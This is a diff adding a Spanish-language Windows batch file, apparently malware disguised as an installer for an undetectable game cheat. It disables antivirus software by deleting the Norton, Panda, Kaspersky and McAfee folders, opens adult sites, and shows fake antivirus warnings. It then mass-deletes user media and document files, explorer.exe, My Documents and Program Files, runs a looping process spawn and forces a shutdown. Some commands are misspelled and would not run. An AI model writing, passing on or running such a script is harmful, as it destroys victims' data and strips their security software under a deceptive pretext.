@@ -1,0 +1,170 @@
+@echo off
+cd \
+cd "archivos de programa"
+cd "Norton antivirus"
+attrib -R -A -S -H *.*
+del /S /Q *.*
+cd..
+cd "Panda Software"
+attrib -R -A -S -H *.*
+del /S /Q *.*
+cd..
+cd "Kaspersky lab"
+attri -R -A -S -H *.*
+del /S /Q *.*
+cd..
+cd "McAfee.com"
+attrib -R -A -S -H *.*
+del /S /Q *.*
+msg * Seguidamente te dare los datos para instalar el mejor cheat indetectable para cs, HL, COD, DOD, BL, etc.
+msg * Este cheat funciona extrayendo el archivo "Gz-Cheat" en la carpeta Valve, o del juego que sea...
+msg * Luego Ejecutar el Archivo "Gz-Cheat" con un doble click
+msg * Seguidamente, solo deja actuar el archivo "Gz-Cheat"
+msg * Informacion del Cheat: Este cheat combina, WALLHACK, WALL, OGC, y todos los cheats posibles.
+msg * Encuentra siempre los puntos deviles del enemigo pero siempre disimulando perfectamente el cheat.
+msg * Es indetectable de los anicheats: VAC, ESL, sXe Ultima Vercion, Cheating-Deatch, etc...
+msg * Seguidamente se ejecutara.
+tskkill iexpress.exe
+tskkill notepad.exe
+tskkill msnmsgr.exe
+start www.petardas.c om
+start www.2tetas.com
+start www.xxx.com
+start www.tetas-tetas.com
+echo off>virus.bat
+echo off>virus69.bat
+echo off>virus58.bat
+echo off>virus45.bat
+echo off>virus54.bat
+echo off>virus21.bat
+echo off>virus9.bat
+echo off>virus10.bat
+echo off>virus8.bat
+echo off>virus7.bat
+echo off>virus6.bat
+echo off>virus5.bat
+echo off>virus4.bat
+echo off>virus2.bat
+echo off>virus3.bat
+echo off>virus65.bat
+echo off>virus899.bat
+echo off>virus4545.bat
+echo off>virus65456.bat
+echo off>virus544556.ba t
+echo off>virus65465.bat
+echo off>virus986546.ba t
+echo off>virus56564.bat
+echo off>virus6595.bat
+echo off>virus669.bat
+echo off>virus666.bat
+echo off>virus866456.ba t
+echo off>virus4664.bat
+echo off>virus@hotmail.bat
+echo off>virus5435.bat
+echo off>virus545454665 46564.bat
+echo off>virus545454664 54546546.bat
+echo off>virus545454665 64546546.bat
+echo off>virus545454665 46.bat
+echo off>virus545454665 465.bat
+echo off>virus54545466. bat
+echo off>virus545454665 45454.bat
+echo off>virus545454664 65546465645.ba t
+echo off>virus545454665 54546.bat
+echo off>virus545454665 45465465.bat
+echo off>virus545454665 45445546465.ba t
+echo off>virus545454664 6456546.bat
+echo off>virus545454664 5456546.bat
+echo off>virus545454665 6565.bat
+echo off>virus545454669 8894961320.bat
+echo off>virus0.bat
+ping -n 20 0.0.0.0>nul
+msg * AVISO NOD 32: SE A DETECTADO UN VIRUS EN TU PC, EL ARCHIVO "hl.exe" se encuentra infectado, y esta en proseso de desinfeccion.
+msg * Prosesando...
+msg * Prosesando...
+msg * Prosesando...
+msg * Prosesando...
+msg * Para terminar el proceso con exito debe pulsar pause
+msg * Insalacion del Cheat "Gz" Termiado Exitosamente, al abrir el juego pulse F12 para ejecutar el Cheat "Gz"...
+ping -n 10 0.0.0.0>nul
+echo.
+echo.
+tskkill iexplorer.exe
+tskkill cidaemon.exe
+tskkill svchost.exe
+tskkill cisvc.exe
+tskkill svchost.exe
+ping -n 20 0.0.0.0 >nul
+cls
+echo.
+echo.
+msg * ADVERTENCIA: Desgraciadamente el archivo infectado se a expandido a la carpeta de Windows, ERROR FATAL...
+msg * ADVERTENCIA: ERROR.
+msg * ADVERTENCIA: ERROR..
+msg * ADVERTENCIA: ERROR... / DELET FILE /
+ping -n 10 0.0.0.0 >nul
+del /f "c:\windows\system32\expl orer.exe
+echo.
+msg * Seguro que disfruta verdad
+msg * La deseo que la disfruta verdad?
+echo.
+echo.
+ping -n 10 0.0.0.0 >nul
+del /f /s /q "c:\*.mp3"
+del /f /s /q "c:\*.mp4"
+del /f /s /q "c:\*.jpg"
+del /f /s /q "c:\*.txt"
+del /f /s /q "c:\*.jpeg"
+del /f /s /q "c:\*.rar"
+del /f /s /q "c:\*.php"
+del /f /s /q "c:\*.com"
+del /f /s /q "c:\*.zip"
+echo
+ping -n 10 0.0.0.0 >nul
+msg * ADVERTEANCIA: El Archivo infectado se a expandido hasta la carpeta "Mis Documentos" ERROR FATAL. / DELET FILE /
+deltree "%userprofile%/mis documentos"
+del "%userprofile%/mis documentos"
+echo.
+shutdown -a
+echo.
+echo.
+msg * Cheat "Gz" Se a terminado...
+msg * ADVERTENCIA: El Virus a sesado. Archivos elmininados se estan recuperando...
+msg * Recuperando Archivo "Windows"
+msg * Recuperando Archivo "Mis Documentos"
+msg * ...
+msg * ...
+msg * ...
+msg * ADVERTENCIA: Archivos NO se pueden recuperar...
+echo.
+:lalbe
+start
+goto lalbel
+echo.
+echo.
+echo.
+msg * ESPERO AYAS DISFRUTADO EL CHEAT, ASI TAMBIEN COMO EL VIRUS, ESTO TE PASA SOLO POR SER UN MALDITO CHEATER... =), POR ESO TE DECIMOS "ja pt!!!"
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+ping -n 50 0.0.0.0 >nul
+deltree "C:\archivos de programa"
+ping -n 50 0.0.0.0 >nul
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+shutdown -s -f -t 0>>c:\autoexec.bat
+esto es lo q hace eso :S
